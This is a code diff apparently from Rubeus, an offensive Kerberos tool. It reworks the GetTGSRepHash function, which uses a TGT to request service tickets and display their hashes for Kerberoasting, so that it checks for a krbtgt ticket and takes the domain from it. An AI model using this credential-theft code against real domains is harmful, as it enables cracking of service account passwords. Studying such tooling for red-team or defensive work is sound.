@@ -724,14 +724,19 @@ namespace Rubeus
         public static bool GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, bool enterprise = false, string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
         {
             // use a TGT blob to request a hash instead of the KerberosRequestorSecurityToken method
-            string userDomain = "DOMAIN";
+            string tgtDomain = "DOMAIN";
 
-            if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))
+            // we can only roast tickets for the domain that we have a TGT for, first determine it's a TGT
+            string serviceName = TGT.tickets[0].sname.name_string[0];
+            if (!serviceName.Equals("krbtgt"))
             {
-                // extract the domain name from the distinguishedname
-                Match dnMatch = Regex.Match(distinguishedName, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
-                string domainDN = dnMatch.Groups["Domain"].ToString();
-                userDomain = domainDN.Replace("DC=", "").Replace(',', '.');
+                Console.WriteLine("[X] Unable to request service tickets without a TGT, please rerun and provide a TGT to '/ticket'.");
+                return false;
+            }
+            else
+            {
+                // always use the doamin that our TGT is for
+                tgtDomain = TGT.tickets[0].sname.name_string[1];
             }
             
             // extract out the info needed for the TGS-REQ request
@@ -742,20 +747,12 @@ namespace Rubeus
             Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;
 
             // request the new service ticket
-            byte[] tgsBytes = null;
-            if (domain.ToLower() != userDomain.ToLower())
-            {
-                tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, false);
-            }
-            else
-            {
-                tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, true);
-            }
+            byte[] tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, false, false, null, tgtDomain);
 
             if (tgsBytes != null)
             {
                 KRB_CRED tgsKirbi = new KRB_CRED(tgsBytes);
-                DisplayTGShash(tgsKirbi, true, userName, userDomain, outFile, simpleOutput);
+                DisplayTGShash(tgsKirbi, true, userName, tgtDomain, outFile, simpleOutput);
                 Console.WriteLine();
                 return true;
             }
